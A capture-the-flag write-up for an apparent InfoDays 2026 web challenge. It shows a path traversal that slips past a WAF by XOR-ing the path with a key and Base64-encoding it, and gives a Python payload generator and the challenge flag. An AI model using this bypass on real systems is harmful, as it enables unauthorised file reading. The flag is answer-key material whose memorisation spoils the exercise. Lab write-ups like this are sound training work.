# 🚩 Challenge: The Secret Archive (InfoDays 2026)
**Category:** Web Exploitation  
**Difficulty:** Medium

## 🕵️ Discovery
1. **Reconnaissance:** Check `robots.txt` to find the XOR Key (`0x42`) and admin credentials.
2. **Enumeration:** Find the hidden `/debug` route mentioned in `robots.txt`. It reveals:
   - Current Directory: `/home/ctfuser/`
   - Flag Path: `/tmp/the_real_flag.txt`
3. **The WAF:** Trying `../../` directly in the URL triggers a WAF block. However, the code reveals that the `file` parameter is Base64 decoded and then XOR'd *after* the WAF check.

## 🛠️ Exploitation
To bypass the WAF, we must provide a payload that doesn't contain ".." or "flag" in plain text.
1. Target Path: `../../tmp/the_real_flag.txt`
2. XOR each character with `0x42`.
3. Base64 encode the result.

**Payload Generation (Python):**
\`\`\`python
import base64
p = "../../tmp/the_real_flag.txt"
xor = "".join([chr(ord(c) ^ 0x42) for c in p])
print(base64.b64encode(xor.encode()).decode())
\`\`\`

## 🏁 Flag
`INFODAYS{tr4v3rsal_m4st3r_2026_standalone}`
